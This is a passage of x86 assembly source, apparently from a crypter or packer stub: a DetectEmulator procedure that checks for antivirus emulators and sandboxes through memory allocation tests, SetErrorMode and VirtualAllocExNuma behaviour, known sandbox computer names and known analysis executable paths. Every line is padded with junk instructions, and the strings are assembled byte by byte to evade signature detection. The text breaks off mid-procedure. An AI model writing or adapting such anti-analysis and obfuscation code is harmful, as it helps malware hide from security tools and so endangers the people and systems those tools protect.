proc DetectEmulator																; --- obfuscation ---
	local	Memory:DWORD
	local	String[MAX_PATH + 1]:BYTE
	local	ComputerName[MAX_PATH + 1]:BYTE
	local	ComputerNameLength:DWORD
	local	ExecutablePath[MAX_PATH + 1]:BYTE
	local	ExecutableFileName[MAX_PATH + 1]:BYTE

	; --------------------------------------------------------------------------

	; Allocating 100 MB of memory must work
																				mov		eax, eax
																				push	eax esi
																				pop		esi eax
	cinvoke	malloc, 100 * 1024 * 1024
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
																				mov		edx, edx
	test	eax, eax
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	jz		.emulator
																				push	esi eax
																				pop		eax esi
																				push	ecx esi
																				pop		esi ecx
	mov		[Memory], eax

	; Actually writing to memory is required to test the allocation
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
	cinvoke	memset, [Memory], 0, 100 * 1024 * 1024
																				push	edi esi
																				pop		esi edi
	cinvoke	free, [Memory]

	; --------------------------------------------------------------------------

	; SetErrorMode return value must match previous value
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
																				push	edx esi
																				pop		esi edx
	invoke	SetErrorMode, 1024
																				pushfd
																				xor		ebx, 0x08d841a7
																				xor		ebx, 0x08d841a7
																				popfd
	invoke	SetErrorMode, 0
																				push	esi edi
																				pop		edi esi
	cmp		eax, 1024
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	jne		.emulator

	; --------------------------------------------------------------------------

	; VirtualAllocExNuma must work
																				push	ecx
																				pop		ecx
																				pushfd
																				push	0x4b49cc44
																				add		esp, 4
																				popfd
	invoke	VirtualAllocExNuma, -1, NULL, 1000, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE, 0
																				push	esi eax
																				pop		eax esi
	test	eax, eax
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
																				push	edx
																				pop		edx
	jz		.emulator

	; --------------------------------------------------------------------------

	; Get computer name
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	mov		[ComputerNameLength], MAX_PATH
																				xchg	esi, ecx
																				xchg	ecx, esi
	lea		eax, [ComputerName]
																				push	ecx
																				pop		ecx
	lea		ebx, [ComputerNameLength]
																				mov		edx, edx
	invoke	GetComputerNameA, eax, ebx
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
																				mov		edi, edi
	test	eax, eax
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	jz		@f

	; Computer name is not "NfZtFbPfH"
																				pushfd
																				xor		ecx, 0xd062f1dc
																				xor		ecx, 0xd062f1dc
																				popfd
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
	lea		eax, [String]
	; Load string: NfZtFbPfH
																				push	ebx esi
																				pop		esi ebx
	mov		ebx, 'a'
																				xchg	ecx, ebx
																				xchg	ebx, ecx
																				xchg	esi, eax
																				xchg	eax, esi
	sub		bl, 19
																				push	eax
																				pop		eax
	mov		byte[eax + 0], bl ;N
																				mov		ecx, ecx
																				pushfd
																				push	0x702c96e2
																				add		esp, 4
																				popfd
	add		bl, 24
																				pushfd
																				push	0x8c9f8fae
																				add		esp, 4
																				popfd
	mov		byte[eax + 1], bl ;f
																				push	edi
																				pop		edi
																				pushfd
																				push	0xd525fb3c
																				add		esp, 4
																				popfd
	sub		bl, 12
																				mov		ebx, ebx
																				push	edx ebx
																				pop		ebx edx
	mov		byte[eax + 2], bl ;Z
																				mov		ebx, ebx
	add		bl, 26
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
																				pushfd
																				xor		edi, 0x596ec656
																				xor		edi, 0x596ec656
																				popfd
	mov		byte[eax + 3], bl ;t
																				mov		ebx, ebx
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
	sub		bl, 46
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
																				push	eax
																				pop		eax
	mov		byte[eax + 4], bl ;F
																				mov		ecx, ecx
	add		bl, 28
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
	mov		byte[eax + 5], bl ;b
																				push	esi
																				pop		esi
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
	sub		bl, 18
																				pushfd
																				xor		ecx, 0x30c82866
																				xor		ecx, 0x30c82866
																				popfd
	mov		byte[eax + 6], bl ;P
																				xchg	ebx, ecx
																				xchg	ecx, ebx
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	add		bl, 22
																				push	edi ebx
																				pop		ebx edi
	mov		byte[eax + 7], bl ;f
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
																				xchg	edx, ecx
																				xchg	ecx, edx
	sub		bl, 30
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	mov		byte[eax + 8], bl ;H
																				mov		eax, eax
	mov		byte[eax + 9], 0
																				push	eax
																				pop		eax
	lea		ebx, [ComputerName]
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
																				xchg	ebx, edi
																				xchg	edi, ebx
	cinvoke	strcmp, eax, ebx
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	test	eax, eax
																				mov		eax, eax
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
	jz		.emulator

	; Computer name is not "ELICZ"
																				xchg	ebx, edx
																				xchg	edx, ebx
																				xchg	esi, esi
	lea		eax, [String]
	; Load string: ELICZ
																				push	edx ebx
																				pop		ebx edx
																				xchg	ebx, ebx
	mov		ebx, 'a'
																				pushfd
																				push	0x9035880b
																				add		esp, 4
																				popfd
	sub		bl, 28
																				push	esi
																				pop		esi
																				xchg	edx, eax
																				xchg	eax, edx
	mov		byte[eax + 0], bl ;E
																				xchg	ecx, ebx
																				xchg	ebx, ecx
																				pushfd
																				xor		esi, 0x7a078972
																				xor		esi, 0x7a078972
																				popfd
	add		bl, 7
																				mov		esi, esi
	mov		byte[eax + 1], bl ;L
																				xchg	ebx, ebx
	sub		bl, 3
																				pushfd
																				xor		ecx, 0x884cc5d2
																				xor		ecx, 0x884cc5d2
																				popfd
																				xchg	ebx, edi
																				xchg	edi, ebx
	mov		byte[eax + 2], bl ;I
																				xchg	ebx, esi
																				xchg	esi, ebx
	sub		bl, 6
																				xchg	edi, edi
																				xchg	ebx, ebx
	mov		byte[eax + 3], bl ;C
																				pushfd
																				xor		ebx, 0xe3eb82c6
																				xor		ebx, 0xe3eb82c6
																				popfd
	add		bl, 23
																				xchg	edi, edi
																				xchg	ecx, edx
																				xchg	edx, ecx
	mov		byte[eax + 4], bl ;Z
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
	mov		byte[eax + 5], 0
																				pushfd
																				push	0x65698a20
																				add		esp, 4
																				popfd
																				pushfd
																				push	0x4b5a5942
																				add		esp, 4
																				popfd
	lea		ebx, [ComputerName]
																				pushfd
																				xor		edx, 0x3a20fedb
																				xor		edx, 0x3a20fedb
																				popfd
																				xchg	edi, edi
	cinvoke	strcmp, eax, ebx
																				pushfd
																				push	0xffb7e71b
																				add		esp, 4
																				popfd
																				xchg	ebx, edx
																				xchg	edx, ebx
	test	eax, eax
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
																				push	ecx
																				pop		ecx
	jz		.emulator

	; Computer name is not "tz"
																				pushfd
																				push	0x0a36c37e
																				add		esp, 4
																				popfd
	lea		eax, [String]
	; Load string: tz
																				xchg	ecx, esi
																				xchg	esi, ecx
	mov		ebx, 'a'
																				push	edi
																				pop		edi
	add		bl, 19
																				pushfd
																				push	0xd1991acb
																				add		esp, 4
																				popfd
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	mov		byte[eax + 0], bl ;t
																				push	edi
																				pop		edi
	add		bl, 6
																				xchg	edx, ebx
																				xchg	ebx, edx
	mov		byte[eax + 1], bl ;z
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	mov		byte[eax + 2], 0
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	lea		ebx, [ComputerName]
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
																				pushfd
																				xor		eax, 0xd1896368
																				xor		eax, 0xd1896368
																				popfd
	cinvoke	strcmp, eax, ebx
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
																				pushfd
																				push	0x263744ed
																				add		esp, 4
																				popfd
	test	eax, eax
																				push	ebx esi
																				pop		esi ebx
	jz		.emulator

	; Computer name is not "MAIN"
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
																				push	ebx
																				pop		ebx
	lea		eax, [String]
	; Load string: MAIN
																				xchg	ecx, ecx
	mov		ebx, 'a'
																				mov		ecx, ecx
	sub		bl, 20
																				push	eax
																				pop		eax
																				push	ecx eax
																				pop		eax ecx
	mov		byte[eax + 0], bl ;M
																				xchg	esi, esi
																				pushfd
																				xor		eax, 0x9d40ba96
																				xor		eax, 0x9d40ba96
																				popfd
	sub		bl, 12
																				xchg	eax, edi
																				xchg	edi, eax
																				push	esi
																				pop		esi
	mov		byte[eax + 1], bl ;A
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
																				pushfd
																				push	0x080ca5e8
																				add		esp, 4
																				popfd
	add		bl, 8
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
																				xchg	edi, edi
	mov		byte[eax + 2], bl ;I
																				pushfd
																				push	0x467a297d
																				add		esp, 4
																				popfd
																				xchg	eax, edx
																				xchg	edx, eax
	add		bl, 5
																				push	ebx edx
																				pop		edx ebx
	mov		byte[eax + 3], bl ;N
																				xchg	edi, ecx
																				xchg	ecx, edi
																				push	ebx edi
																				pop		edi ebx
	mov		byte[eax + 4], 0
																				push	esi
																				pop		esi
	lea		ebx, [ComputerName]
																				xchg	edx, ebx
																				xchg	ebx, edx
	cinvoke	strcmp, eax, ebx
																				xchg	esi, ebx
																				xchg	ebx, esi
																				pushfd
																				xor		edx, 0x19f38749
																				xor		edx, 0x19f38749
																				popfd
	test	eax, eax
																				push	eax
																				pop		eax
																				mov		ecx, ecx
	jz		.emulator
																				xchg	edx, edi
																				xchg	edi, edx
																				xchg	esi, edx
																				xchg	edx, esi
@@:

	; --------------------------------------------------------------------------

	; Get executable path
																				push	ecx eax
																				pop		eax ecx
	lea		eax, [ExecutablePath]
																				mov		edi, edi
	invoke	GetModuleFileNameA, NULL, eax, MAX_PATH
																				pushfd
																				push	0x81651d86
																				add		esp, 4
																				popfd
																				pushfd
																				xor		edx, 0xf66e159d
																				xor		edx, 0xf66e159d
																				popfd
	cmp		eax, 0
																				mov		edi, edi
	jle		@f

	; Get executable filename
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	lea		eax, [ExecutablePath]
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	invoke	PathFindFileNameA, eax
																				pushfd
																				xor		ebx, 0x2f498b88
																				xor		ebx, 0x2f498b88
																				popfd
																				mov		ecx, ecx
	lea		ebx, [ExecutableFileName]
																				xchg	ecx, ecx
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
	invoke	strcpy, ebx, eax

	; Executable path is not "C:\[...]\mwsmpl.exe"
																				xchg	edi, edi
	lea		eax, [String]
	; Load string: C:\Documents and Settings\Administrator\My Documents\mwsmpl.exe
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
	mov		ebx, 'a'
																				mov		esi, esi
																				push	esi
																				pop		esi
	sub		bl, 30
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
	mov		byte[eax + 0], bl ;C
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
																				push	ecx
																				pop		ecx
	sub		bl, 9
																				pushfd
																				xor		ebx, 0x82961229
																				xor		ebx, 0x82961229
																				popfd
	mov		byte[eax + 1], bl ;:
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
	add		bl, 34
																				xchg	edx, eax
																				xchg	eax, edx
	mov		byte[eax + 2], bl ;\
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
																				xchg	esi, esi
	sub		bl, 24
																				xchg	edx, ecx
																				xchg	ecx, edx
																				push	ebx
																				pop		ebx
	mov		byte[eax + 3], bl ;D
																				push	edx eax
																				pop		eax edx
																				push	eax edx
																				pop		edx eax
	add		bl, 43
																				pushfd
																				push	0x4c94ae8b
																				add		esp, 4
																				popfd
	mov		byte[eax + 4], bl ;o
																				pushfd
																				xor		edx, 0x4026c4c3
																				xor		edx, 0x4026c4c3
																				popfd
																				xchg	esi, esi
	sub		bl, 12
																				pushfd
																				push	0x971313aa
																				add		esp, 4
																				popfd
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	mov		byte[eax + 5], bl ;c
																				pushfd
																				xor		ebx, 0x5c208f90
																				xor		ebx, 0x5c208f90
																				popfd
	add		bl, 18
																				xchg	edx, edx
																				mov		eax, eax
	mov		byte[eax + 6], bl ;u
																				xchg	edx, edx
																				push	eax
																				pop		eax
	sub		bl, 8
																				pushfd
																				xor		esi, 0x8e2d428d
																				xor		esi, 0x8e2d428d
																				popfd
	mov		byte[eax + 7], bl ;m
																				xchg	edi, ebx
																				xchg	ebx, edi
																				xchg	esi, esi
	sub		bl, 8
																				pushfd
																				push	0xaf996b2d
																				add		esp, 4
																				popfd
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	mov		byte[eax + 8], bl ;e
																				pushfd
																				push	0x13398fb3
																				add		esp, 4
																				popfd
	add		bl, 9
																				mov		ecx, ecx
																				pushfd
																				push	0x98e8e930
																				add		esp, 4
																				popfd
	mov		byte[eax + 9], bl ;n
																				xchg	eax, eax
	add		bl, 6
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
																				pushfd
																				xor		ebx, 0xe854a56b
																				xor		ebx, 0xe854a56b
																				popfd
	mov		byte[eax + 10], bl ;t
																				pushfd
																				push	0xb5f3530a
																				add		esp, 4
																				popfd
	dec		bl
																				pushfd
																				xor		edx, 0xe239d5ec
																				xor		edx, 0xe239d5ec
																				popfd
																				pushfd
																				push	0x21ee1f6f
																				add		esp, 4
																				popfd
	mov		byte[eax + 11], bl ;s
																				push	eax esi
																				pop		esi eax
	sub		bl, 83
																				mov		ecx, ecx
	mov		byte[eax + 12], bl ; 
																				xchg	ebx, eax
																				xchg	eax, ebx
	add		bl, 65
																				xchg	esi, eax
																				xchg	eax, esi
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	mov		byte[eax + 13], bl ;a
																				xchg	edx, edx
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	add		bl, 13
																				push	edx
																				pop		edx
	mov		byte[eax + 14], bl ;n
																				push	edi ebx
																				pop		ebx edi
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	sub		bl, 10
																				pushfd
																				xor		edx, 0xd402e2c7
																				xor		edx, 0xd402e2c7
																				popfd
																				xchg	edx, edx
	mov		byte[eax + 15], bl ;d
																				mov		eax, eax
																				mov		eax, eax
	sub		bl, 68
																				pushfd
																				push	0x7a32c3c6
																				add		esp, 4
																				popfd
																				mov		edi, edi
	mov		byte[eax + 16], bl ; 
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
	add		bl, 51
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	mov		byte[eax + 17], bl ;S
																				xchg	edi, edi
	add		bl, 18
																				pushfd
																				xor		esi, 0x6cb78e65
																				xor		esi, 0x6cb78e65
																				popfd
	mov		byte[eax + 18], bl ;e
																				push	eax
																				pop		eax
																				pushfd
																				push	0x2d84ab08
																				add		esp, 4
																				popfd
	add		bl, 15
																				xchg	edi, eax
																				xchg	eax, edi
	mov		byte[eax + 19], bl ;t
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
	mov		byte[eax + 20], bl ;t
																				xchg	edi, edi
																				push	ebx ecx
																				pop		ecx ebx
	sub		bl, 11
																				pushfd
																				push	0x7a23f8a0
																				add		esp, 4
																				popfd
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
	mov		byte[eax + 21], bl ;i
																				mov		ebx, ebx
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
	add		bl, 5
																				push	ebx
																				pop		ebx
																				mov		edi, edi
	mov		byte[eax + 22], bl ;n
																				push	edx esi
																				pop		esi edx
	sub		bl, 7
																				xchg	ebx, ecx
																				xchg	ecx, ebx
	mov		byte[eax + 23], bl ;g
																				xchg	ecx, ebx
																				xchg	ebx, ecx
	add		bl, 12
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	mov		byte[eax + 24], bl ;s
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
	sub		bl, 23
																				pushfd
																				xor		esi, 0x8128158a
																				xor		esi, 0x8128158a
																				popfd
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
	mov		byte[eax + 25], bl ;\
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
																				pushfd
																				push	0x3d647bfc
																				add		esp, 4
																				popfd
	sub		bl, 27
																				xchg	ebx, edx
																				xchg	edx, ebx
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	mov		byte[eax + 26], bl ;A
																				pushfd
																				push	0xf1342786
																				add		esp, 4
																				popfd
																				xchg	ebx, ecx
																				xchg	ecx, ebx
	add		bl, 35
																				xchg	edi, edi
	mov		byte[eax + 27], bl ;d
																				pushfd
																				push	0x686b4bf5
																				add		esp, 4
																				popfd
																				xchg	edx, edx
	add		bl, 9
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	mov		byte[eax + 28], bl ;m
																				pushfd
																				push	0x32cd30c9
																				add		esp, 4
																				popfd
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	sub		bl, 4
																				push	edx ecx
																				pop		ecx edx
	mov		byte[eax + 29], bl ;i
																				xchg	edi, edi
	add		bl, 5
																				pushfd
																				xor		ebx, 0x22621e35
																				xor		ebx, 0x22621e35
																				popfd
																				mov		ecx, ecx
	mov		byte[eax + 30], bl ;n
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	sub		bl, 5
																				push	edx
																				pop		edx
	mov		byte[eax + 31], bl ;i
																				push	eax edi
																				pop		edi eax
																				pushfd
																				push	0xc62ec52e
																				add		esp, 4
																				popfd
	add		bl, 10
																				xchg	ecx, ecx
	mov		byte[eax + 32], bl ;s
																				pushfd
																				xor		edx, 0x7ffd3a67
																				xor		edx, 0x7ffd3a67
																				popfd
	inc		bl
																				push	ebx
																				pop		ebx
																				xchg	edx, edi
																				xchg	edi, edx
	mov		byte[eax + 33], bl ;t
																				pushfd
																				xor		edi, 0xa8467659
																				xor		edi, 0xa8467659
																				popfd
																				mov		ebx, ebx
	sub		bl, 2
																				mov		ebx, ebx
	mov		byte[eax + 34], bl ;r
																				mov		ecx, ecx
																				mov		edx, edx
	sub		bl, 17
																				push	ecx
																				pop		ecx
	mov		byte[eax + 35], bl ;a
																				pushfd
																				push	0x8d067f00
																				add		esp, 4
																				popfd
	add		bl, 19
																				push	edx eax
																				pop		eax edx
																				xchg	ebx, ebx
	mov		byte[eax + 36], bl ;t
																				pushfd
																				xor		ecx, 0x934d54ff
																				xor		ecx, 0x934d54ff
																				popfd
	sub		bl, 5
																				mov		edi, edi
	mov		byte[eax + 37], bl ;o
																				xchg	eax, eax
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
	add		bl, 3
																				pushfd
																				push	0xae92e59b
																				add		esp, 4
																				popfd
																				push	esi
																				pop		esi
	mov		byte[eax + 38], bl ;r
																				pushfd
																				push	0x82812996
																				add		esp, 4
																				popfd
	sub		bl, 22
																				pushfd
																				xor		esi, 0x619c3817
																				xor		esi, 0x619c3817
																				popfd
																				push	edx ebx
																				pop		ebx edx
	mov		byte[eax + 39], bl ;\
																				xchg	edi, edx
																				xchg	edx, edi
	sub		bl, 15
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	mov		byte[eax + 40], bl ;M
																				push	edi
																				pop		edi
																				pushfd
																				push	0xb175e21e
																				add		esp, 4
																				popfd
	add		bl, 44
																				mov		eax, eax
																				xchg	ebx, ebx
	mov		byte[eax + 41], bl ;y
																				push	edi
																				pop		edi
																				pushfd
																				push	0x5ca8deda
																				add		esp, 4
																				popfd
	sub		bl, 89
																				pushfd
																				push	0x3bf96a99
																				add		esp, 4
																				popfd
																				xchg	ebx, ecx
																				xchg	ecx, ebx
	mov		byte[eax + 42], bl ; 
																				push	edx esi
																				pop		esi edx
																				xchg	edi, edi
	add		bl, 36
																				push	ecx
																				pop		ecx
																				mov		edi, edi
	mov		byte[eax + 43], bl ;D
																				push	edi
																				pop		edi
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	add		bl, 43
																				push	esi edx
																				pop		edx esi
																				pushfd
																				xor		eax, 0x48f8e4b8
																				xor		eax, 0x48f8e4b8
																				popfd
	mov		byte[eax + 44], bl ;o
																				xchg	edx, edx
	sub		bl, 12
																				mov		ecx, ecx
	mov		byte[eax + 45], bl ;c
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
																				push	ebx
																				pop		ebx
	add		bl, 18
																				push	edx
																				pop		edx
	mov		byte[eax + 46], bl ;u
																				push	eax
																				pop		eax
	sub		bl, 8
																				mov		ecx, ecx
	mov		byte[eax + 47], bl ;m
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
																				pushfd
																				push	0xf6448032
																				add		esp, 4
																				popfd
	sub		bl, 8
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
																				push	edi ebx
																				pop		ebx edi
	mov		byte[eax + 48], bl ;e
																				pushfd
																				xor		edx, 0x68304b82
																				xor		edx, 0x68304b82
																				popfd
																				mov		ecx, ecx
	add		bl, 9
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	mov		byte[eax + 49], bl ;n
																				pushfd
																				xor		edi, 0x042b680c
																				xor		edi, 0x042b680c
																				popfd
																				mov		edi, edi
	add		bl, 6
																				pushfd
																				push	0xab9da4b5
																				add		esp, 4
																				popfd
	mov		byte[eax + 50], bl ;t
																				push	ebx
																				pop		ebx
	dec		bl
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	mov		byte[eax + 51], bl ;s
																				push	edi esi
																				pop		esi edi
	sub		bl, 23
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
																				pushfd
																				push	ebx
																				add		esp, 4
																				popfd
	mov		byte[eax + 52], bl ;\
																				xchg	edx, ecx
																				xchg	ecx, edx
																				mov		edx, edx
	add		bl, 17
																				push	edx
																				pop		edx
																				push	edi ecx
																				pop		ecx edi
	mov		byte[eax + 53], bl ;m
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	add		bl, 10
																				mov		ecx, ecx
	mov		byte[eax + 54], bl ;w
																				pushfd
																				push	0xf6202a09
																				add		esp, 4
																				popfd
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	sub		bl, 4
																				xchg	edx, edx
																				push	edi edx
																				pop		edx edi
	mov		byte[eax + 55], bl ;s
																				push	edx ebx
																				pop		ebx edx
																				push	eax esi
																				pop		esi eax
	sub		bl, 6
																				xchg	ebx, ebx
	mov		byte[eax + 56], bl ;m
																				mov		eax, eax
	add		bl, 3
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	mov		byte[eax + 57], bl ;p
																				pushfd
																				push	0x4a464888
																				add		esp, 4
																				popfd
	sub		bl, 4
																				xchg	eax, eax
																				pushfd
																				inc		edi
																				dec		edi
																				popfd
	mov		byte[eax + 58], bl ;l
																				pushfd
																				push	0x78c8c319
																				add		esp, 4
																				popfd
	sub		bl, 62
																				pushfd
																				push	0xd17c288c
																				add		esp, 4
																				popfd
	mov		byte[eax + 59], bl ;.
																				mov		esi, esi
																				pushfd
																				push	0x490923e7
																				add		esp, 4
																				popfd
	add		bl, 55
																				pushfd
																				push	0xf8cbdb0a
																				add		esp, 4
																				popfd
																				mov		ebx, ebx
	mov		byte[eax + 60], bl ;e
																				xchg	eax, eax
																				xchg	ecx, ecx
	add		bl, 19
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	mov		byte[eax + 61], bl ;x
																				pushfd
																				push	ecx
																				add		esp, 4
																				popfd
	sub		bl, 19
																				xchg	eax, ebx
																				xchg	ebx, eax
	mov		byte[eax + 62], bl ;e
																				pushfd
																				push	0xb507db15
																				add		esp, 4
																				popfd
	mov		byte[eax + 63], 0
																				push	edi eax
																				pop		eax edi
																				pushfd
																				xor		edx, 0x0fd0971c
																				xor		edx, 0x0fd0971c
																				popfd
	lea		ebx, [ExecutablePath]
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
	cinvoke	strcmpi, eax, ebx
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
																				pushfd
																				xor		ecx, 0xae1d651c
																				xor		ecx, 0xae1d651c
																				popfd
	test	eax, eax
																				mov		eax, eax
	jz		.emulator

	; Executable path is not "C:\SELF.EXE"
																				pushfd
																				push	0x21b8d357
																				add		esp, 4
																				popfd
																				push	eax ebx
																				pop		ebx eax
	lea		eax, [String]
	; Load string: C:\SELF.EXE
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	mov		ebx, 'a'
																				xchg	ebx, ebx
																				xchg	edi, edi
	sub		bl, 30
																				mov		edx, edx
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	mov		byte[eax + 0], bl ;C
																				mov		edx, edx
	sub		bl, 9
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	mov		byte[eax + 1], bl ;:
																				xchg	ebx, ebx
																				pushfd
																				xor		edi, 0x6a47489c
																				xor		edi, 0x6a47489c
																				popfd
	add		bl, 34
																				xchg	edx, edx
	mov		byte[eax + 2], bl ;\
																				push	edi
																				pop		edi
																				pushfd
																				xor		ebx, 0x2081e07d
																				xor		ebx, 0x2081e07d
																				popfd
	sub		bl, 9
																				push	ecx
																				pop		ecx
	mov		byte[eax + 3], bl ;S
																				pushfd
																				xor		eax, 0xf463c310
																				xor		eax, 0xf463c310
																				popfd
	sub		bl, 14
																				push	eax edi
																				pop		edi eax
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	mov		byte[eax + 4], bl ;E
																				pushfd
																				xor		ebx, 0xf3dd484a
																				xor		ebx, 0xf3dd484a
																				popfd
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
	add		bl, 7
																				mov		edx, edx
	mov		byte[eax + 5], bl ;L
																				push	esi eax
																				pop		eax esi
	sub		bl, 6
																				xchg	edx, edx
	mov		byte[eax + 6], bl ;F
																				mov		eax, eax
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	sub		bl, 24
																				push	edx ecx
																				pop		ecx edx
	mov		byte[eax + 7], bl ;.
																				push	edx edi
																				pop		edi edx
																				pushfd
																				inc		esi
																				dec		esi
																				popfd
	add		bl, 23
																				pushfd
																				inc		edx
																				dec		edx
																				popfd
																				pushfd
																				xor		eax, 0x40b922c8
																				xor		eax, 0x40b922c8
																				popfd
	mov		byte[eax + 8], bl ;E
																				push	ecx
																				pop		ecx
																				mov		ebx, ebx
	add		bl, 19
																				push	esi
																				pop		esi
																				mov		edx, edx
	mov		byte[eax + 9], bl ;X
																				xchg	esi, ebx
																				xchg	ebx, esi
																				pushfd
																				push	0x73bdd598
																				add		esp, 4
																				popfd
	sub		bl, 19
																				pushfd
																				push	0x170a4c3a
																				add		esp, 4
																				popfd
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	mov		byte[eax + 10], bl ;E
																				push	edi eax
																				pop		eax edi
																				push	eax
																				pop		eax
	mov		byte[eax + 11], 0
																				pushfd
																				push	edx
																				add		esp, 4
																				popfd
	lea		ebx, [ExecutablePath]
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
																				push	ebx
																				pop		ebx
	cinvoke	strcmpi, eax, ebx
																				mov		edx, edx
	test	eax, eax
																				xchg	edx, edx
	jz		.emulator

	; Executable filename is not "myapp.exe"
																				xchg	esi, edi
																				xchg	edi, esi
	lea		eax, [String]
	; Load string: myapp.exe
																				pushfd
																				xor		ecx, 0x3f869610
																				xor		ecx, 0x3f869610
																				popfd
	mov		ebx, 'a'
																				xchg	ecx, edi
																				xchg	edi, ecx
	add		bl, 12
																				mov		esi, esi
																				pushfd
																				inc		ecx
																				dec		ecx
																				popfd
	mov		byte[eax + 0], bl ;m
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
																				pushfd
																				xor		edi, 0xb759ed8f
																				xor		edi, 0xb759ed8f
																				popfd
	add		bl, 12
																				push	edi ecx
																				pop		ecx edi
																				pushfd
																				xor		eax, 0x01291666
																				xor		eax, 0x01291666
																				popfd
	mov		byte[eax + 1], bl ;y
																				push	esi
																				pop		esi
	sub		bl, 24
																				pushfd
																				push	0x9491648e
																				add		esp, 4
																				popfd
																				pushfd
																				push	0xf1ca8198
																				add		esp, 4
																				popfd
	mov		byte[eax + 2], bl ;a
																				push	esi
																				pop		esi
																				pushfd
																				xor		ecx, 0x08ef3687
																				xor		ecx, 0x08ef3687
																				popfd
	add		bl, 15
																				pushfd
																				push	esi
																				add		esp, 4
																				popfd
																				mov		esi, esi
	mov		byte[eax + 3], bl ;p
																				pushfd
																				xor		esi, 0x185d3e32
																				xor		esi, 0x185d3e32
																				popfd
	mov		byte[eax + 4], bl ;p
																				pushfd
																				xor		eax, 0x612756a4
																				xor		eax, 0x612756a4
																				popfd
	sub		bl, 66
																				xchg	eax, eax
	mov		byte[eax + 5], bl ;.
																				pushfd
																				push	0x0ca68956
																				add		esp, 4
																				popfd
																				xchg	edx, edx
	add		bl, 55
																				mov		esi, esi
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
	mov		byte[eax + 6], bl ;e
																				xchg	edx, edx
																				pushfd
																				push	0x638be8c3
																				add		esp, 4
																				popfd
	add		bl, 19
